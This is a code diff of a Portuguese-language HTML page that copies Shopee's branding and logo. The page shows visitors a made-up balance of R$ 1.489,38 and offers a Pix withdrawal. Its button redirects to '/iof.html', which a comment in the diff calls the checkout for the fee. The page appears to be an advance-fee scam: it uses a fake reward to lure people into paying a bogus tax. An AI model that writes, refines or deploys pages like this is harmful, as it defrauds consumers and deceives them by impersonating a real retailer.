@@ -6,123 +6,46 @@
     <title>Resgate de Saldo</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f5f5f5;
-            margin: 0;
-            padding: 15px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* CARD VERMELHO */
+        body { font-family: 'Roboto', sans-serif; background-color: #f5f5f5; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        
         .top-card {
             background: linear-gradient(135deg, #ee4d2d, #ff7337);
-            width: 100%;
-            max-width: 480px;
-            border-radius: 8px;
-            padding: 20px;
-            color: white;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            margin-bottom: 15px;
-            position: relative;
+            width: 100%; max-width: 480px; border-radius: 8px; padding: 20px; color: white;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-bottom: 15px; position: relative;
         }
         .top-card h3 { margin: 0; font-size: 14px; font-weight: 500; opacity: 0.9; }
         .top-card h1 { margin: 5px 0 15px 0; font-size: 32px; font-weight: 700; }
         .coin-icon { position: absolute; top: 20px; right: 20px; background: #f0c419; color: #ee4d2d; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
 
-        /* CARD BRANCO */
-        .withdraw-card {
-            background: white;
-            width: 100%;
-            max-width: 480px;
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-            margin-bottom: 15px;
-        }
+        .withdraw-card { background: white; width: 100%; max-width: 480px; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); margin-bottom: 15px; }
         .withdraw-title { font-size: 16px; font-weight: 700; color: #222; margin-bottom: 15px; }
-
-        /* LINHA DO PIX */
-        .pix-row {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            margin-bottom: 15px;
-            font-size: 13px;
-            color: #555;
-            font-weight: 500;
-        }
-        .pix-icon {
-            height: 16px; /* Tamanho perfeito para alinhar com texto */
-            width: auto;
-        }
         
-        /* BOTÕES DE OPÇÃO */
+        .pix-row { display: flex; align-items: center; gap: 6px; margin-bottom: 15px; font-size: 13px; color: #555; font-weight: 500; }
+        .pix-icon { height: 16px; width: auto; }
+        
         .options-row { display: flex; gap: 10px; margin-bottom: 10px; }
-        
-        .money-option {
-            background: #f5f5f5;
-            border: 1px solid #e0e0e0;
-            border-radius: 6px;
-            padding: 12px 0;
-            text-align: center;
-            font-weight: 600;
-            color: #333;
-            cursor: pointer;
-            transition: all 0.2s;
-            flex: 1;
-        }
-
+        .money-option { background: #f5f5f5; border: 1px solid #e0e0e0; border-radius: 6px; padding: 12px 0; text-align: center; font-weight: 600; color: #333; cursor: pointer; transition: all 0.2s; flex: 1; }
         .money-option.big { width: 100%; font-size: 24px; padding: 20px 0; margin-bottom: 20px; }
+        .money-option.selected { border: 2px solid #ee4d2d; color: #ee4d2d; background-color: #fff5f5; }
 
-        /* BOTÃO SELECIONADO */
-        .money-option.selected {
-            border: 2px solid #ee4d2d;
-            color: #ee4d2d;
-            background-color: #fff5f5;
-        }
-
-        /* BOTÃO SACAR */
-        .btn-sacar {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 700;
-            color: white;
-            background-color: #ccc;
-            cursor: not-allowed;
-            transition: 0.3s;
-        }
-        .btn-sacar.active {
-            background-color: #ee4d2d;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3);
-        }
+        .btn-sacar { width: 100%; padding: 15px; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; color: white; background-color: #ccc; cursor: not-allowed; transition: 0.3s; }
+        .btn-sacar.active { background-color: #ee4d2d; cursor: pointer; box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); }
 
         .info-text { font-size: 12px; color: #888; text-align: center; margin-top: 15px; line-height: 1.4; }
-        .footer-banner { width: 100%; max-width: 480px; margin-top: 10px; text-align: center; }
         .shopee-logo { width: 60px; opacity: 0.8; }
     </style>
 </head>
 <body>
-
     <div class="top-card">
         <div class="coin-icon">$</div>
         <h3>Seu saldo</h3>
         <h1>R$ 1.489,38</h1>
         <div style="font-size: 12px; opacity: 0.8;">= 42.583,05 pontos (s)</div>
-        <div style="border-top: 1px dashed rgba(255,255,255,0.3); margin-top: 15px; padding-top: 10px; font-size: 11px;">
-            Última bonificação apresentada : R$ 845,24
-        </div>
+        <div style="border-top: 1px dashed rgba(255,255,255,0.3); margin-top: 15px; padding-top: 10px; font-size: 11px;">Última bonificação apresentada : R$ 845,24</div>
     </div>
 
     <div class="withdraw-card">
         <div class="withdraw-title">Sacar dinheiro</div>
-        
         <div class="pix-row">
             <span>Transferência via /</span>
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg" class="pix-icon" alt="Pix">
@@ -134,46 +57,33 @@
             <div class="money-option" onclick="selectValue(this)">R$10</div>
         </div>
 
-        <div class="money-option big" onclick="selectValue(this)">
-            R$ 1.489,38
-        </div>
+        <div class="money-option big" onclick="selectValue(this)">R$ 1.489,38</div>
 
-        <button id="btn-sacar" class="btn-sacar" onclick="irParaCheckout()">
-            Sacar dinheiro
-        </button>
+        <button id="btn-sacar" class="btn-sacar" onclick="irParaCheckout()">Sacar dinheiro</button>
 
-        <p class="info-text">
-            Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
-        </p>
+        <p class="info-text">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.</p>
     </div>
 
     <div class="withdraw-card">
         <div class="withdraw-title">Obtenha seu acesso exclusivo</div>
-        <p style="font-size:12px; color:#666; line-height:1.5;">
-            Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações.
-        </p>
-        <div style="text-align:right; margin-top:10px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo">
-        </div>
+        <p style="font-size:12px; color:#666; line-height:1.5;">Descubra todos os benefícios liberados especialmente para você.</p>
+        <div style="text-align:right; margin-top:10px;"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo"></div>
     </div>
 
     <script>
         function selectValue(element) {
-            const buttons = document.querySelectorAll('.money-option');
-            buttons.forEach(btn => btn.classList.remove('selected'));
+            document.querySelectorAll('.money-option').forEach(btn => btn.classList.remove('selected'));
             element.classList.add('selected');
-
-            const btnSacar = document.getElementById('btn-sacar');
-            btnSacar.classList.add('active');
-            btnSacar.innerText = "SACAR AGORA";
+            const btn = document.getElementById('btn-sacar');
+            btn.classList.add('active');
+            btn.innerText = "SACAR AGORA";
         }
-
         function irParaCheckout() {
             const btn = document.getElementById('btn-sacar');
             if (btn.classList.contains('active')) {
-                window.location.href = "/iof.html";
+                window.location.href = "/iof.html"; // Redireciona para o checkout da taxa
             } else {
-                alert("Por favor, selecione um valor para sacar.");
+                alert("Selecione um valor.");
             }
         }
     </script>
